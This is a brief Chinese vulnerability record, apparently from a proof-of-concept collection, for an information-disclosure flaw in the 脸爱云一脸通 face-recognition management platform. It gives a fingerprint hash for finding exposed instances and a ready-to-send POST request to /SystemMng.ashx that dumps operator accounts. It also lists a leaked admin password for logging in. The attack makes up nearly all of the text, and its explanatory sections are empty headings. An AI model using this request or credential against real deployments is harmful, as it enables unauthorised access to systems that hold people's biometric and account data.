# 脸爱云一脸通智慧管理平台SystemMng存在信息泄露漏洞

- **系统**：脸爱云一脸通智慧管理平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
- **请求**：`POST /SystemMng.ashx HTTP/1.1`
- **关键头**：`Content-Length: 91`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators

使用泄露的账号密码登录系统`admin/LSFace2023`
```

**其他**
- 脸爱云一脸通智慧管理平台SystemMng存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 脸爱云一脸通智慧管理平台